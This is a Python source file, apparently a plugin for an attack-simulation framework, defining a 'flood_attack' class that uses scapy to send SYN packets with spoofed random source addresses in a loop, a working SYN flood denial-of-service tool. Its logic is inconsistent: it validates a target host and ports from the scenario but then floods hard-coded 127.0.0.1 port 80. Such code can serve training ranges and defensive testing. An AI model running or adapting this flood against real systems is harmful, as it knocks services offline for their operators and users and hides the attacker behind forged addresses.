import ipaddress
from scapy.all import *
from random import randint

from scapy.layers.inet import IP, TCP

COMMAND_KEY = "command"
TARGET_HOST_KEY = "host"
PORT_KEY = "port"
COMMENT_COMMAND_SUCCESS = "Command execution succeeded"
COMMENT_COMMAND_FAILURE = "Command execution failed"
COMMENT_COMMAND_BLANK = "Command is empty"
COMMENT_HOST_BLANK = "Target Host is empty"
COMMENT_PORT_BLANK = "Port is empty"
COMMENT_IP_ADDRESS_INVALID = "IP Address is invalid"


class flood_attack:
    def check(self, action):
        return True

    def action(self, team_name, address, action, data):

        target_host = ""
        # specify the target host
        if TARGET_HOST_KEY in action and self.is_valid_ip_address(action[TARGET_HOST_KEY]):
            target_host = action[TARGET_HOST_KEY]
        elif self.is_valid_ip_address(data):
            target_host = data
        else:
            return False, COMMENT_HOST_BLANK, {}

        if len(target_host) == 0:
            return False, COMMENT_HOST_BLANK, {}
        else:
            # Get all ports from previous executed action or from the scenario port key
            ports_array = []
            if PORT_KEY in action:
                # Check if port is declared as a number or some numbers with commas
                number_and_comma_pattern = re.compile("^[0-9]+(,[0-9]+)*$")
                number_pattern = re.compile("^[0-9]*$")
                ports_str = action[PORT_KEY]
                if re.match(number_and_comma_pattern, ports_str) or re.match(number_pattern, ports_str):
                    if "," in ports_str:
                        ports_array = ports_str.split(",")
                    else:
                        ports_array.append(ports_str)
                else:
                    return False, COMMENT_PORT_BLANK, {}
            else:
                if len(data) == 0:
                    return False, "data: " + COMMENT_PORT_BLANK, {}
                else:
                    ports_array = data

            # flood attack
            self.syn_flood_attack("127.0.0.1", 80, 1000)
            return True, ports_array, {}

    def syn_flood_attack(self, target_ip, target_port, limit):
        total = 0
        print("Packets are sending ...")
        start_ip = "192.168.122.200"
        end_ip = "192.168.122.254"

        for x in range(0, limit):
            s_port = randint(1000, 9000)
            s_eq = randint(1000, 9000)
            w_indow = randint(1000, 9000)

            IP_Packet = IP()
            IP_Packet.src = self.generate_random_ip(start_ip, end_ip)
            IP_Packet.dst = target_ip

            TCP_Packet = TCP()
            TCP_Packet.sport = s_port
            TCP_Packet.dport = target_port
            TCP_Packet.flags = "S"
            TCP_Packet.seq = s_eq
            TCP_Packet.window = w_indow

            send(IP_Packet / TCP_Packet, verbose=0)
            total += 1

    def generate_random_ip(self, start_ip, end_ip):
        start = list(map(int, start_ip.split(".")))
        end = list(map(int, end_ip.split(".")))
        ip = ".".join(map(str, (random.randint(start[i], end[i]) for i in range(4))))
        return ip

    def is_valid_ip_address(self, ip_string):
        try:
            ip_object = ipaddress.ip_address(ip_string)
            return True
        except ValueError:
            return False
